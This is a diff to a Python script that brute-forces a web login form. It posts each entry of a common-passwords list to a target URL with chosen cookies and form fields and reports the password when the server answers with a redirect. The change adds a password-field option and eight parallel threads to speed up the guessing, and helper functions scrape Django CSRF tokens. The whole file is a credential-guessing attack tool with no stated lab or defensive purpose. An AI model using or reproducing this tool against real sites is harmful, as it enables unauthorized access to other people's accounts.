@@ -4,6 +4,8 @@ import requests
 import re
 import json
 import ast
+import threading
+pwfoundflag = 0
 
 def main():
     argcounter = 0
@@ -17,8 +19,9 @@ def main():
             print("-c <name:value>  Cookies")
             print("-p <name:value>  Post Parameters")
             print("-u <url>  URL")
+            print("-passfield <name>  name of field that needs to be cracked")
             break
-        try: 
+        try:
             arg = sys.argv[argcounter+1]
         except:
             break
@@ -30,10 +33,28 @@ def main():
         if argtag == "-c":
             x = arg.split(":")
             cookies[x[0]] = x[1]
-            
-    bruteforce(url,cookies,params)
-    
-    
+        if argtag == "-passfield":
+            passwordfield = arg
+
+    t1 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":1,"pwf":passwordfield})
+    t2 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":2,"pwf":passwordfield})
+    t3 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":3,"pwf":passwordfield})
+    t4 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":4,"pwf":passwordfield})
+    t5 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":5,"pwf":passwordfield})
+    t6 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":6,"pwf":passwordfield})
+    t7 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":7,"pwf":passwordfield})
+    t8 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":8,"pwf":passwordfield})
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+    t5.start()
+    t6.start()
+    t7.start()
+    t8.start()
+    bruteforce(url,cookies,params,0,passwordfield)
+
+
 def searchformiddleware(input):
         x = input.text
         inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
@@ -47,16 +68,20 @@ def getcookie(req):
     csrftoken = req.cookies.get("csrftoken")
 
 
-def bruteforce(url,cookies,parameters):
+def bruteforce(url,cookies,parameters,index,pwf):
+    global pwfoundflag
     filez = open("1000-most-common-passwords.txt","r")
     passworddict =filez.readlines()
-    counter = 0
-    while (counter < len(passworddict)):
-        password = passworddict[counter].strip()
-        print("Trying Password: "+ password)
+    while (index < len(passworddict)):
+        password = passworddict[index].strip()
         headers = {'Content-type': 'application/x-www-form-urlencoded'}
+        parameters[pwf]=password
+        print(parameters)
         submitform = requests.post(headers=headers,url=url,cookies=cookies,data=parameters)
-        counter = counter + 1
+        index = index + 9
+        if pwfoundflag !=0:
+            break
+        print("Trying Password: "+ password)
         if submitform.status_code == 302:
             print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
             print("Password is    " + password)
@@ -65,5 +90,3 @@ def bruteforce(url,cookies,parameters):
         print("password not found")
 
 main()
-
-
